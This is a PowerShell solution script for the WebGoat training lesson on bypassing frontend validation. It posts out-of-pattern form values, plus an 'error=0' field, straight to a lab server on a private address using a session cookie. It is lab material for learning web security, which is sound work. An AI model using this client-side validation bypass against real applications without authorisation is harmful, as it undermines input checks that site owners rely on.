# ============================================================
# Frontend Validation Bypass - PowerShell Attack
# ============================================================

$webGoatUrl = "http://192.168.254.112:8001/WebGoat"
$sessionCookie = "25A6B220A4CB5215EBBE7B31E207B4B1"

Write-Host "=====================================" -ForegroundColor Cyan
Write-Host "Frontend Validation Bypass" -ForegroundColor Cyan
Write-Host "=====================================" -ForegroundColor Cyan
Write-Host ""

$headers = @{
    "Content-Type" = "application/x-www-form-urlencoded"
    "Cookie" = "JSESSIONID=$sessionCookie"
}

# Build payload with INVALID values (violate all patterns)
$payload = @{
    field1 = "ABC"              # Should be lowercase -> UPPERCASE
    field2 = "abc"              # Should be digits -> LETTERS
    field3 = "test!"            # Should be alphanumeric -> SPECIAL CHAR
    field4 = "ten"              # Should be one-nine -> NOT IN LIST
    field5 = "1234"             # Should be 5 digits -> 4 DIGITS
    field6 = "123456789"        # Should be zip format -> WRONG FORMAT
    field7 = "101-234-5678"     # Should start 2-9 -> STARTS WITH 1
    error = "0"                 # Bypass validation check
}

Write-Host "Sending invalid values (all violate patterns):" -ForegroundColor Yellow
foreach ($key in $payload.Keys) {
    Write-Host "  $key = $($payload[$key])" -ForegroundColor White
}
Write-Host ""

# Convert to URL-encoded form data
$bodyParts = @()
foreach ($key in $payload.Keys) {
    $value = [System.Web.HttpUtility]::UrlEncode($payload[$key])
    $bodyParts += "$key=$value"
}
$body = $bodyParts -join "&"

try {
    Write-Host "Sending POST to: $webGoatUrl/BypassRestrictions/frontendValidation" -ForegroundColor Gray
    Write-Host ""
    
    $response = Invoke-WebRequest `
        -Uri "$webGoatUrl/BypassRestrictions/frontendValidation" `
        -Method POST `
        -Headers $headers `
        -Body $body `
        -UseBasicParsing
    
    $result = $response.Content | ConvertFrom-Json
    
    Write-Host "Response:" -ForegroundColor Green
    Write-Host "  Feedback: $($result.feedback)" -ForegroundColor White
    Write-Host "  Lesson Completed: $($result.lessonCompleted)" -ForegroundColor White
    Write-Host ""
    
    if ($result.output) {
        Write-Host "Output:" -ForegroundColor Cyan
        Write-Host "  $($result.output)" -ForegroundColor White
        Write-Host ""
    }
    
    if ($result.lessonCompleted -eq $true) {
        Write-Host "================================================" -ForegroundColor Green
        Write-Host "SUCCESS! Challenge completed!" -ForegroundColor Green
        Write-Host "================================================" -ForegroundColor Green
        Write-Host ""
        Write-Host "All validations bypassed:" -ForegroundColor White
        Write-Host "  field1: ABC (uppercase)" -ForegroundColor Cyan
        Write-Host "  field2: abc (letters)" -ForegroundColor Cyan
        Write-Host "  field3: test! (special char)" -ForegroundColor Cyan
        Write-Host "  field4: ten (not in enum)" -ForegroundColor Cyan
        Write-Host "  field5: 1234 (4 digits)" -ForegroundColor Cyan
        Write-Host "  field6: 123456789 (wrong format)" -ForegroundColor Cyan
        Write-Host "  field7: 101-234-5678 (starts with 1)" -ForegroundColor Cyan
        Write-Host ""
    } else {
        Write-Host "Challenge not completed yet." -ForegroundColor Yellow
        Write-Host "Feedback: $($result.feedback)" -ForegroundColor White
        Write-Host ""
        Write-Host "Try the browser console method:" -ForegroundColor Yellow
        Write-Host "  1. Open lesson page in browser" -ForegroundColor White
        Write-Host "  2. Press F12 -> Console" -ForegroundColor White
        Write-Host "  3. Run: .\frontend_validation_bypass.js" -ForegroundColor White
    }
    
} catch {
    Write-Host "[ERROR] Request failed: $_" -ForegroundColor Red
    
    if ($_.Exception.Response) {
        Write-Host "Status: $($_.Exception.Response.StatusCode.value__)" -ForegroundColor Red
    }
    
    Write-Host ""
    Write-Host "Use browser console instead:" -ForegroundColor Yellow
    Write-Host "  Open frontend_validation_bypass.js" -ForegroundColor White
    Write-Host "  Copy contents to browser console" -ForegroundColor White
    Write-Host "  Run: bypassValidation()" -ForegroundColor White
}
